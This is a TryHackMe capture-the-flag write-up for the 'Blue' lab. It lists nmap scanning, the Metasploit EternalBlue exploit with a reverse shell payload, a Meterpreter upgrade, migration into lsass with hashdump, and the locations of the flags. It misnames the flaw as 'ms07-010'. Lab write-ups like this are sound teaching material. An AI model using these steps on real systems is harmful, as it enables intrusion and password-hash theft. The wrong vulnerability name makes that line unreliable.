# TryHackMe Writeup: Blue Room

## Part 1: Enumeration and Exploitation

### Question: How many ports are open with a port number under 1000?
Run the following command to identify open ports:

```bash
nmap -sSV -p1-1000 --script vuln 10.64.147.22
```

### Question: What is this machine vulnerable to?
The machine is vulnerable to:

```text
ms07-010
```

## Part 2: Post-Exploitation

### Exploitation Code
Use the following Metasploit commands to exploit the machine:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.64.147.22
set payload windows/x64/shell/reverse_tcp
```

### Converting Shell to Meterpreter
To convert a shell to a Meterpreter shell in Metasploit, use the following steps:

```bash
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
```

### Post-Exploitation Commands

```bash
ps
migrate <PID_lsass.exe>
hashdump
```

## Part 3: Flags

### Flag 1
This flag can be found at the system root:

```bash
cd C:/
```

### Flag 2
Where Windows stores the SAM file, which contains the password hashes for all user accounts on the system. The flag is likely hidden in this directory:

```bash
cd C:\Windows\System32\config
```

### Flag 3
This flag can be found in an excellent location to loot. It is located in Jon's Documents folder:

```bash
cd C:\Users\Jon\Documents
cat flag3.txt
```